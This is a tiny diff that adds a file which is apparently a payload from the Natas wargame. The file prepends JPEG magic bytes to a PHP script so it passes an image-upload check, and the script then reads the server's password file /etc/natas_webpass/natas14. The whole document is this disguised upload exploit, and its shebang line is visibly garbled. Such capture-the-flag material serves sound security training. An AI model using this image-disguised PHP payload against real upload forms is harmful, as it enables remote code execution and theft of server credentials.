@@ -1,0 +1,7 @@
+ÿØÿâsr/bin/php
+
+<?php
+
+readfile('/etc/natas_webpass/natas14');
+
+?>
